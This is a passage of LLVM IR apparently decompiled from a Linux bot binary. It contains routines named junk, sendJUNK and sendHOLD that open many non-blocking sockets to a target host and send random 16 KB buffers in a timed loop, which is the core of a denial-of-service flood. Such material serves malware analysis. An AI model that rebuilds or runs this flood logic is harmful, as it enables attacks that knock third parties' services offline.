  store i32 0, i32* %v2_805172e, align 4
  %v0_8051736 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051736 = load i32, i32* @esp, align 4
  %v2_8051736 = inttoptr i32 %v1_8051736 to i32*
  store i32 %v0_8051736, i32* %v2_8051736, align 4
  %v0_8051739 = load i32, i32* %stack_var_-200, align 4
  %v2_8051739 = load i32, i32* %stack_var_-192, align 4
  %v5_8051739 = call i32 @__libc_select(i32 %v0_8051739, i32 10000, i32 %v2_8051739, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051739, i32* %eax.global-to-local, align 4
  %v12_8051741 = icmp eq i32 %v5_8051739, 1
  %v1_8051745 = icmp eq i1 %v12_8051741, false
  br i1 %v1_8051745, label %dec_label_pc_80517c1, label %dec_label_pc_8051747

dec_label_pc_8051747:                             ; preds = %dec_label_pc_80516b7
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_8051757 = load i32, i32* %v4_80516d6, align 8
  store i32 %v5_8051757, i32* %edx.global-to-local, align 4
  %v1_8051760 = load i32, i32* @esp, align 4
  %v2_8051760 = add i32 %v1_8051760, 16
  %v3_8051760 = inttoptr i32 %v2_8051760 to i32*
  store i32 %v2_805175a, i32* %v3_8051760, align 4
  store i32 %v2_8051764, i32* %eax.global-to-local, align 4
  %v1_805176a = load i32, i32* @esp, align 4
  %v2_805176a = add i32 %v1_805176a, 12
  %v3_805176a = inttoptr i32 %v2_805176a to i32*
  store i32 %v2_8051764, i32* %v3_805176a, align 4
  %v0_805176e = load i32, i32* @esp, align 4
  %v1_805176e = add i32 %v0_805176e, 8
  %v2_805176e = inttoptr i32 %v1_805176e to i32*
  store i32 4, i32* %v2_805176e, align 4
  %v0_8051776 = load i32, i32* @esp, align 4
  %v1_8051776 = add i32 %v0_8051776, 4
  %v2_8051776 = inttoptr i32 %v1_8051776 to i32*
  store i32 1, i32* %v2_8051776, align 4
  %v0_805177e = load i32, i32* %edx.global-to-local, align 4
  %v1_805177e = load i32, i32* @esp, align 4
  %v2_805177e = inttoptr i32 %v1_805177e to i32*
  store i32 %v0_805177e, i32* %v2_805177e, align 4
  %v0_8051781 = load i32, i32* %stack_var_-204, align 4
  %v1_8051781 = call i32 @getsockopt(i32 %v0_8051781)
  %v3_8051786 = load i32, i32* %stack_var_-208, align 4
  %v1_805178c = icmp eq i32 %v3_8051786, 0
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  br i1 %v1_805178c, label %dec_label_pc_80517b1, label %dec_label_pc_8051790

dec_label_pc_8051790:                             ; preds = %dec_label_pc_8051747
  %v5_8051796 = load i32, i32* %v4_80516d6, align 8
  store i32 %v5_8051796, i32* %eax.global-to-local, align 4
  %v1_8051799 = load i32, i32* @esp, align 4
  %v2_8051799 = inttoptr i32 %v1_8051799 to i32*
  store i32 %v5_8051796, i32* %v2_8051799, align 4
  %v0_805179c = load i32, i32* %stack_var_-204, align 4
  %v1_805179c = call i32 @close(i32 %v0_805179c)
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80515bd, align 4
  br label %dec_label_pc_8051866

dec_label_pc_80517b1:                             ; preds = %dec_label_pc_8051747
  store i8 2, i8* %v5_80515bd, align 4
  br label %dec_label_pc_8051866

dec_label_pc_80517c1:                             ; preds = %dec_label_pc_80516b7
  %v13_80517c1 = icmp eq i32 %v5_8051739, -1
  %v1_80517c5 = icmp eq i1 %v13_80517c1, false
  br i1 %v1_80517c5, label %dec_label_pc_8051866, label %dec_label_pc_80517cb

dec_label_pc_80517cb:                             ; preds = %dec_label_pc_80517c1
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_80517d1 = load i32, i32* %v4_80516d6, align 8
  store i32 %v5_80517d1, i32* %eax.global-to-local, align 4
  %v1_80517d4 = load i32, i32* @esp, align 4
  %v2_80517d4 = inttoptr i32 %v1_80517d4 to i32*
  store i32 %v5_80517d1, i32* %v2_80517d4, align 4
  %v1_80517d7 = call i32 @close(i32 %v5_8051739)
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80515bd, align 4
  br label %dec_label_pc_8051866

dec_label_pc_80517e9:                             ; preds = %dec_label_pc_80515d8
  %v0_80517e9 = load i32, i32* @esp, align 4
  %v1_80517e9 = add i32 %v0_80517e9, 4
  %v2_80517e9 = inttoptr i32 %v1_80517e9 to i32*
  store i32 1024, i32* %v2_80517e9, align 4
  %v0_80517f1 = load i32, i32* @esp, align 4
  %v1_80517f1 = inttoptr i32 %v0_80517f1 to i32*
  store i32 32, i32* %v1_80517f1, align 4
  %v2_80517f8 = call i32 @realrand(i32 %v7_80515bd, i32 %v12_805148e)
  %v1_8051803 = load i32, i32* @esp, align 4
  %v2_8051803 = add i32 %v1_8051803, 4
  %v3_8051803 = inttoptr i32 %v2_8051803 to i32*
  store i32 %v2_80517f8, i32* %v3_8051803, align 4
  store i32 %v1_805156a, i32* %eax.global-to-local, align 4
  %v1_805180a = load i32, i32* @esp, align 4
  %v2_805180a = inttoptr i32 %v1_805180a to i32*
  store i32 %v1_805156a, i32* %v2_805180a, align 4
  %v2_805180d = inttoptr i32 %v2_80517f8 to i8*
  %v3_805180d = call i32 @makeRandomShit(i8* %v2_805180d, i32 %v5_80515a0)
  store i32 %v2_80517f8, i32* @ecx, align 4
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v3_805181b = add i32 %v2_80515bd, %v2_805152d
  %v4_805181b = inttoptr i32 %v3_805181b to i32*
  %v5_805181b = load i32, i32* %v4_805181b, align 8
  store i32 %v5_805181b, i32* %edx.global-to-local, align 4
  %v0_805181e = load i32, i32* @esp, align 4
  %v1_805181e = add i32 %v0_805181e, 12
  %v2_805181e = inttoptr i32 %v1_805181e to i32*
  store i32 16384, i32* %v2_805181e, align 4
  %v0_8051826 = load i32, i32* @ecx, align 4
  %v1_8051826 = load i32, i32* @esp, align 4
  %v2_8051826 = add i32 %v1_8051826, 8
  %v3_8051826 = inttoptr i32 %v2_8051826 to i32*
  store i32 %v0_8051826, i32* %v3_8051826, align 4
  store i32 %v1_805156a, i32* %eax.global-to-local, align 4
  %v1_805182d = load i32, i32* @esp, align 4
  %v2_805182d = add i32 %v1_805182d, 4
  %v3_805182d = inttoptr i32 %v2_805182d to i32*
  store i32 %v1_805156a, i32* %v3_805182d, align 4
  %v0_8051831 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051831 = load i32, i32* @esp, align 4
  %v2_8051831 = inttoptr i32 %v1_8051831 to i32*
  store i32 %v0_8051831, i32* %v2_8051831, align 4
  %v4_8051834 = call i32 @send(i32 %v2_80517f8, i32 %v5_80515a0, i32 %stack_var_-20.141, i32 %stack_var_-16.142)
  store i32 %v4_8051834, i32* %eax.global-to-local, align 4
  %v10_8051839 = icmp eq i32 %v4_8051834, -1
  %v1_805183c = icmp eq i1 %v10_8051839, false
  br i1 %v1_805183c, label %dec_label_pc_8051866, label %dec_label_pc_805183e

dec_label_pc_805183e:                             ; preds = %dec_label_pc_80517e9
  %v1_805183e = call i32 @__errno_location(i32 %v2_80517f8)
  store i32 %v1_805183e, i32* %eax.global-to-local, align 4
  %v1_8051843 = inttoptr i32 %v1_805183e to i32*
  %v2_8051843 = load i32, i32* %v1_8051843, align 4
  store i32 %v2_8051843, i32* %eax.global-to-local, align 4
  %v9_8051845 = icmp eq i32 %v2_8051843, 11
  br i1 %v9_8051845, label %dec_label_pc_8051866, label %dec_label_pc_805184a

dec_label_pc_805184a:                             ; preds = %dec_label_pc_805183e
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_8051850 = load i32, i32* %v4_805181b, align 8
  store i32 %v5_8051850, i32* %eax.global-to-local, align 4
  %v1_8051853 = load i32, i32* @esp, align 4
  %v2_8051853 = inttoptr i32 %v1_8051853 to i32*
  store i32 %v5_8051850, i32* %v2_8051853, align 4
  %v1_8051856 = call i32 @close(i32 %v2_80517f8)
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80515bd, align 4
  br label %dec_label_pc_8051866

dec_label_pc_8051866:                             ; preds = %dec_label_pc_80515e5, %dec_label_pc_805183e, %dec_label_pc_80517e9, %dec_label_pc_80517c1, %dec_label_pc_80517cb, %dec_label_pc_80517b1, %dec_label_pc_8051790, %dec_label_pc_80516a7, %dec_label_pc_8051691, %dec_label_pc_805184a
  %stack_var_-20.0 = phi i32 [ %v6_80516c8, %dec_label_pc_80517c1 ], [ %v6_80516c8, %dec_label_pc_80517cb ], [ %v6_80516c8, %dec_label_pc_80517b1 ], [ %v6_80516c8, %dec_label_pc_8051790 ], [ %stack_var_-20.141, %dec_label_pc_80517e9 ], [ %stack_var_-20.141, %dec_label_pc_805183e ], [ %stack_var_-20.141, %dec_label_pc_805184a ], [ %stack_var_-20.141, %dec_label_pc_8051691 ], [ %stack_var_-20.141, %dec_label_pc_80516a7 ], [ %stack_var_-20.141, %dec_label_pc_80515e5 ]
  %stack_var_-16.0 = phi i32 [ %v2_80516c1, %dec_label_pc_80517c1 ], [ %v2_80516c1, %dec_label_pc_80517cb ], [ %v2_80516c1, %dec_label_pc_80517b1 ], [ %v2_80516c1, %dec_label_pc_8051790 ], [ %stack_var_-16.142, %dec_label_pc_80517e9 ], [ %stack_var_-16.142, %dec_label_pc_805183e ], [ %stack_var_-16.142, %dec_label_pc_805184a ], [ %stack_var_-16.142, %dec_label_pc_8051691 ], [ %stack_var_-16.142, %dec_label_pc_80516a7 ], [ %stack_var_-16.142, %dec_label_pc_80515e5 ]
  %v4_8051866 = add nuw nsw i32 %storemerge43, 1
  store i32 %v4_8051866, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8051866, %v2_80514aa
  br i1 %exitcond, label %dec_label_pc_8051875, label %dec_label_pc_80515b7

dec_label_pc_8051875:                             ; preds = %dec_label_pc_8051869.preheader, %dec_label_pc_8051866, %dec_label_pc_80514e8
  %stack_var_-40.0 = phi i32 [ %tmp6, %dec_label_pc_80514e8 ], [ 0, %dec_label_pc_8051869.preheader ], [ %v2_80514aa, %dec_label_pc_8051866 ]
  %stack_var_-20.2 = phi i32 [ %tmp4, %dec_label_pc_80514e8 ], [ %stack_var_-20.2, %dec_label_pc_8051869.preheader ], [ %stack_var_-20.0, %dec_label_pc_8051866 ]
  %stack_var_-16.2 = phi i32 [ %tmp3, %dec_label_pc_80514e8 ], [ %stack_var_-16.2, %dec_label_pc_8051869.preheader ], [ %stack_var_-16.0, %dec_label_pc_8051866 ]
  %v0_8051875 = load i32, i32* @esp, align 4
  %v1_8051875 = inttoptr i32 %v0_8051875 to i32*
  store i32 0, i32* %v1_8051875, align 4
  %v1_805187c = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_805187c = call i32 @__GI_time(i32* %v1_805187c)
  store i32 %v2_805187c, i32* %eax.global-to-local, align 4
  %v5_8051884 = icmp slt i32 %v2_805187c, %v5_80515a0
  br i1 %v5_8051884, label %dec_label_pc_8051869.preheader, label %dec_label_pc_805188a

dec_label_pc_8051869.preheader:                   ; preds = %dec_label_pc_8051875
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_805186c39, label %dec_label_pc_80515b7, label %dec_label_pc_8051875

dec_label_pc_805188a:                             ; preds = %dec_label_pc_8051875, %entry
  %v0_8051896 = phi i32 [ %v3_80514da, %entry ], [ %v2_805187c, %dec_label_pc_8051875 ]
  ret i32 %v0_8051896

; uselistorder directives
  uselistorder i32 %v4_8051866, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_80517f8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8051739, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80516e7, { 1, 0 }
  uselistorder i32* %v4_80516d6, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_80515bd, { 6, 1, 0, 2, 3, 4, 5, 7 }
  uselistorder i8* %v5_80515bd, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-20.141, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-16.142, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge43, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 0, 1 }
  uselistorder i32 %v5_80515a0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805156a, { 1, 0, 3, 2, 4, 6, 5 }
  uselistorder i32 %v2_805154a, { 1, 0 }
  uselistorder i32 %v2_805152d, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 5, 4 }
  uselistorder i32 %v1_80514b8, { 1, 0 }
  uselistorder i32 %v2_80514aa, { 3, 2, 0, 1 }
  uselistorder i32 %v1_805149c, { 1, 0, 2 }
  uselistorder i32 %v12_805148e, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0, 2 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 54, 1, 43, 0, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 14, 15, 13, 16, 17, 21, 18, 19, 20, 22, 23, 25, 24, 28, 26, 27, 29, 30, 34, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 44, 46, 45, 48, 47, 49, 51, 50, 52, 53 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051866, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_80518a2 = icmp sgt i32 %arg3, 2
  br i1 %v7_80518a2, label %dec_label_pc_80518a4, label %dec_label_pc_80518b8

dec_label_pc_80518a4:                             ; preds = %entry
  %v1_80518a7 = add i32 %arg4, 12
  %v1_80518aa = inttoptr i32 %v1_80518a7 to i32*
  %v2_80518aa = load i32, i32* %v1_80518aa, align 4
  %v1_80518af = call i32 @atol(i32 %v2_80518aa)
  %v2_80518b4 = icmp slt i32 %v1_80518af, 0
  %v1_80518b6 = icmp eq i1 %v2_80518b4, false
  br i1 %v1_80518b6, label %dec_label_pc_80518d4, label %dec_label_pc_80518b8

dec_label_pc_80518b8:                             ; preds = %entry, %dec_label_pc_80518a4
  %v3_80518cd = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806b0e4.250 to i32))
  br label %dec_label_pc_8051951

dec_label_pc_80518d4:                             ; preds = %dec_label_pc_80518a4
  %v1_80518da = call i32 @mfork(i32 %arg2)
  %v1_80518df = icmp eq i32 %v1_80518da, 0
  %v1_80518e1 = icmp eq i1 %v1_80518df, false
  br i1 %v1_80518e1, label %dec_label_pc_8051951, label %dec_label_pc_80518e3

dec_label_pc_80518e3:                             ; preds = %dec_label_pc_80518d4
  %v1_80518e6 = add i32 %arg4, 8
  %v1_80518e9 = inttoptr i32 %v1_80518e6 to i32*
  %v1_80518ee = add i32 %arg4, 4
  %v3_8051910 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806b108.251 to i32))
  %v2_805191b = load i32, i32* %v1_80518aa, align 4
  %v1_8051920 = call i32 @atol(i32 %v2_805191b)
  store i32 %v1_8051920, i32* @ebx, align 4
  %v2_805192d = load i32, i32* %v1_80518e9, align 4
  %v1_8051932 = call i32 @atol(i32 %v2_805192d)
  %v1_805193f = inttoptr i32 %v1_80518ee to i32*
  %v2_805193f = load i32, i32* %v1_805193f, align 4
  %v0_8051941 = load i32, i32* @ebx, align 4
  %v4_805194c = call i32 @sendJUNK(i32 %v2_805193f, i32 %v1_8051932, i32 %v0_8051941)
  br label %dec_label_pc_8051951

dec_label_pc_8051951:                             ; preds = %dec_label_pc_80518d4, %dec_label_pc_80518b8, %dec_label_pc_80518e3
  %v0_8051956 = phi i32 [ %v1_80518da, %dec_label_pc_80518d4 ], [ %v3_80518cd, %dec_label_pc_80518b8 ], [ %v4_805194c, %dec_label_pc_80518e3 ]
  ret i32 %v0_8051956

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051951, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80518b8, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %v12_805195c = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v12_805195c, i32* %eax.global-to-local, align 4
  %v1_805196a = call i32 @getdtablesize(i32 %v12_805195c)
  store i32 %v1_805196a, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_805196a, 0
  %v2_8051973 = zext i1 %tmp to i32
  %v2_8051976 = add i32 %v2_8051973, %v1_805196a
  %v2_8051978 = sdiv i32 %v2_8051976, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_8051986 = urem i32 %arg2, 65536
  store i32 %v1_8051986, i32* %eax.global-to-local, align 4
  store i32 %v1_8051986, i32* %stack_var_-252, align 4
  %v1_805198c = trunc i32 %arg2 to i16
  %v2_805198c = call i32 @htons(i16 %v1_805198c)
  %v2_8051998 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-252, align 4
  %v3_80519a8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_80519a8, i32* %eax.global-to-local, align 4
  %v1_80519ad = icmp eq i32 %v3_80519a8, 0
  br i1 %v1_80519ad, label %dec_label_pc_80519b6, label %dec_label_pc_8051d59

dec_label_pc_80519b6:                             ; preds = %entry
  %v15_80519c9 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_80519c9, i32* %eax.global-to-local, align 4
  store i32 %v15_80519c9, i32* %stack_var_-252, align 4
  %v3_80519cf = bitcast i32* %stack_var_-56 to i8*
  %v4_80519cf = call i32 @__GI_memset(i8* %v3_80519cf, i32 0, i32 8)
  %v2_80519d7 = mul i32 %v2_8051978, 8
  %v1_80519dd = add i32 %v2_80519d7, 30
  %v2_80519e0 = and i32 %v1_80519dd, -16
  %v0_80519e6 = load i32, i32* @esp, align 4
  %v2_80519e6 = sub i32 %v0_80519e6, %v2_80519e0
  %v1_80519f8 = add i32 %v2_80519e6, 35
  %v2_80519fb = and i32 %v1_80519f8, -16
  %v2_8051a18 = mul i32 %v2_8051978, 5
  store i32 %v2_8051a18, i32* %eax.global-to-local, align 4
  store i32 %v2_80519fb, i32* %edx.global-to-local, align 4
  %v2_8051a1d = add i32 %v2_80519e6, 8
  %v3_8051a1d = inttoptr i32 %v2_8051a1d to i32*
  store i32 %v2_8051a18, i32* %v3_8051a1d, align 4
  %v0_8051a21 = load i32, i32* @esp, align 4
  %v1_8051a21 = add i32 %v0_8051a21, 4
  %v2_8051a21 = inttoptr i32 %v1_8051a21 to i32*
  store i32 0, i32* %v2_8051a21, align 4
  %v0_8051a29 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a29 = load i32, i32* @esp, align 4
  %v2_8051a29 = inttoptr i32 %v1_8051a29 to i32*
  store i32 %v0_8051a29, i32* %v2_8051a29, align 4
  %v3_8051a2c = inttoptr i32 %v2_80519fb to i8*
  %v4_8051a2c = call i32 @__GI_memset(i8* %v3_8051a2c, i32 %tmp7, i32 %v12_805195c)
  store i32 %v4_8051a2c, i32* %eax.global-to-local, align 4
  %v0_8051a31 = load i32, i32* @esp, align 4
  %v1_8051a31 = inttoptr i32 %v0_8051a31 to i32*
  store i32 0, i32* %v1_8051a31, align 4
  %v1_8051a38 = inttoptr i32 %v2_80519fb to i32*
  %v2_8051a38 = call i32 @__GI_time(i32* %v1_8051a38)
  %v5_8051a3d = add i32 %v2_8051a38, %arg3
  store i32 %v5_8051a3d, i32* %eax.global-to-local, align 4
  %v3_8051a5a = or i32 %v2_80519fb, 4
  %v2_8051b5e = ptrtoint i32* %stack_var_-192 to i32
  %tmp32 = bitcast i32* %stack_var_-192 to i8*
  %v2_8051baf = ptrtoint i32* %stack_var_-200 to i32
  %v2_8051bf7 = ptrtoint i32* %stack_var_-204 to i32
  %v2_8051c01 = ptrtoint i32* %stack_var_-208 to i32
  %v16_8051d3b39 = icmp sgt i32 %v2_8051976, 1
  br label %dec_label_pc_8051d44

dec_label_pc_8051a54:                             ; preds = %dec_label_pc_8051d38.preheader, %dec_label_pc_8051d35
  %storemerge41 = phi i32 [ %v4_8051d35, %dec_label_pc_8051d35 ], [ 0, %dec_label_pc_8051d38.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_80519fb, i32* %edx.global-to-local, align 4
  %v2_8051a5a = mul i32 %storemerge41, 8
  %v4_8051a5a = add i32 %v2_8051a5a, %v3_8051a5a
  %v5_8051a5a = inttoptr i32 %v4_8051a5a to i8*
  %v6_8051a5a = load i8, i8* %v5_8051a5a, align 4
  %v7_8051a5a = zext i8 %v6_8051a5a to i32
  store i32 %v7_8051a5a, i32* %eax.global-to-local, align 4
  %v8_8051a68 = icmp eq i8 %v6_8051a5a, 0
  %v12_8051a68 = icmp eq i8 %v6_8051a5a, 1
  br i1 %v12_8051a68, label %dec_label_pc_8051b54, label %dec_label_pc_8051a75

dec_label_pc_8051a75:                             ; preds = %dec_label_pc_8051a54
  %v12_8051a75 = icmp eq i8 %v6_8051a5a, 2
  br i1 %v12_8051a75, label %dec_label_pc_8051c89, label %dec_label_pc_8051a82

dec_label_pc_8051a82:                             ; preds = %dec_label_pc_8051a75
  br i1 %v8_8051a68, label %dec_label_pc_8051a90, label %dec_label_pc_8051d35

dec_label_pc_8051a90:                             ; preds = %dec_label_pc_8051a82
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_8051a93 = load i32, i32* @esp, align 4
  %v1_8051a93 = add i32 %v0_8051a93, 8
  %v2_8051a93 = inttoptr i32 %v1_8051a93 to i32*
  store i32 0, i32* %v2_8051a93, align 4
  %v0_8051a9b = load i32, i32* @esp, align 4
  %v1_8051a9b = add i32 %v0_8051a9b, 4
  %v2_8051a9b = inttoptr i32 %v1_8051a9b to i32*
  store i32 1, i32* %v2_8051a9b, align 4
  %v0_8051aa3 = load i32, i32* @esp, align 4
  %v1_8051aa3 = inttoptr i32 %v0_8051aa3 to i32*
  store i32 2, i32* %v1_8051aa3, align 4
  %v3_8051aaa = call i32 @socket(i32 %v7_8051a5a, i32 %v12_805195c, i32 ptrtoint (i32* @0 to i32))
  %v2_8051ab4 = load i32, i32* @ebx, align 4
  %v3_8051ab4 = mul i32 %v2_8051ab4, 8
  %v4_8051ab4 = add i32 %v3_8051ab4, %v2_80519fb
  %v5_8051ab4 = inttoptr i32 %v4_8051ab4 to i32*
  store i32 %v3_8051aaa, i32* %v5_8051ab4, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v3_8051abd = add i32 %v2_8051a5a, %v2_80519fb
  %v4_8051abd = inttoptr i32 %v3_8051abd to i32*
  %v5_8051abd = load i32, i32* %v4_8051abd, align 8
  store i32 %v5_8051abd, i32* %eax.global-to-local, align 4
  %v0_8051ac0 = load i32, i32* @esp, align 4
  %v1_8051ac0 = add i32 %v0_8051ac0, 8
  %v2_8051ac0 = inttoptr i32 %v1_8051ac0 to i32*
  store i32 0, i32* %v2_8051ac0, align 4
  %v0_8051ac8 = load i32, i32* @esp, align 4
  %v1_8051ac8 = add i32 %v0_8051ac8, 4
  %v2_8051ac8 = inttoptr i32 %v1_8051ac8 to i32*
  store i32 3, i32* %v2_8051ac8, align 4
  %v0_8051ad0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ad0 = load i32, i32* @esp, align 4
  %v2_8051ad0 = inttoptr i32 %v1_8051ad0 to i32*
  store i32 %v0_8051ad0, i32* %v2_8051ad0, align 4
  %v3_8051ad3 = call i32 @fcntl(i32 %v7_8051a5a, i32 %v12_805195c, i32 ptrtoint (i32* @0 to i32))
  %v1_8051ada = or i32 %v3_8051ad3, 2048
  store i32 %v1_8051ada, i32* @ecx, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051ae6 = load i32, i32* %v4_8051abd, align 8
  store i32 %v5_8051ae6, i32* %eax.global-to-local, align 4
  %v1_8051ae9 = load i32, i32* @esp, align 4
  %v2_8051ae9 = add i32 %v1_8051ae9, 8
  %v3_8051ae9 = inttoptr i32 %v2_8051ae9 to i32*
  store i32 %v1_8051ada, i32* %v3_8051ae9, align 4
  %v0_8051aed = load i32, i32* @esp, align 4
  %v1_8051aed = add i32 %v0_8051aed, 4
  %v2_8051aed = inttoptr i32 %v1_8051aed to i32*
  store i32 4, i32* %v2_8051aed, align 4
  %v0_8051af5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051af5 = load i32, i32* @esp, align 4
  %v2_8051af5 = inttoptr i32 %v1_8051af5 to i32*
  store i32 %v0_8051af5, i32* %v2_8051af5, align 4
  %v3_8051af8 = call i32 @fcntl(i32 %v7_8051a5a, i32 %v12_805195c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8051998, i32* @ecx, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051b06 = load i32, i32* %v4_8051abd, align 8
  store i32 %v5_8051b06, i32* %eax.global-to-local, align 4
  %v0_8051b09 = load i32, i32* @esp, align 4
  %v1_8051b09 = add i32 %v0_8051b09, 8
  %v2_8051b09 = inttoptr i32 %v1_8051b09 to i32*
  store i32 16, i32* %v2_8051b09, align 4
  %v1_8051b11 = load i32, i32* @esp, align 4
  %v2_8051b11 = add i32 %v1_8051b11, 4
  %v3_8051b11 = inttoptr i32 %v2_8051b11 to i32*
  store i32 %v2_8051998, i32* %v3_8051b11, align 4
  %v0_8051b15 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b15 = load i32, i32* @esp, align 4
  %v2_8051b15 = inttoptr i32 %v1_8051b15 to i32*
  store i32 %v0_8051b15, i32* %v2_8051b15, align 4
  %v3_8051b18 = call i32 @connect(i32 %v7_8051a5a, i32 %v12_805195c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8051b18, i32* %eax.global-to-local, align 4
  %v10_8051b1d = icmp eq i32 %v3_8051b18, -1
  %v1_8051b20 = icmp eq i1 %v10_8051b1d, false
  br i1 %v1_8051b20, label %dec_label_pc_8051b2e, label %dec_label_pc_8051b22

dec_label_pc_8051b22:                             ; preds = %dec_label_pc_8051a90
  %v1_8051b22 = call i32 @__errno_location(i32 %v7_8051a5a)
  store i32 %v1_8051b22, i32* %eax.global-to-local, align 4
  %v1_8051b27 = inttoptr i32 %v1_8051b22 to i32*
  %v2_8051b27 = load i32, i32* %v1_8051b27, align 4
  store i32 %v2_8051b27, i32* %eax.global-to-local, align 4
  %v9_8051b29 = icmp eq i32 %v2_8051b27, 115
  br i1 %v9_8051b29, label %dec_label_pc_8051b44, label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b22, %dec_label_pc_8051a90
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_80519fb, i32* %edx.global-to-local, align 4
  %v5_8051b34 = load i32, i32* %v4_8051abd, align 8
  store i32 %v5_8051b34, i32* %eax.global-to-local, align 4
  %v1_8051b37 = load i32, i32* @esp, align 4
  %v2_8051b37 = inttoptr i32 %v1_8051b37 to i32*
  store i32 %v5_8051b34, i32* %v2_8051b37, align 4
  %v1_8051b3a = call i32 @close(i32 %v7_8051a5a)
  store i32 %v1_8051b3a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051b44:                             ; preds = %dec_label_pc_8051b22
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_8051a5a, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051b54:                             ; preds = %dec_label_pc_8051a54
  store i32 0, i32* %eax.global-to-local, align 4
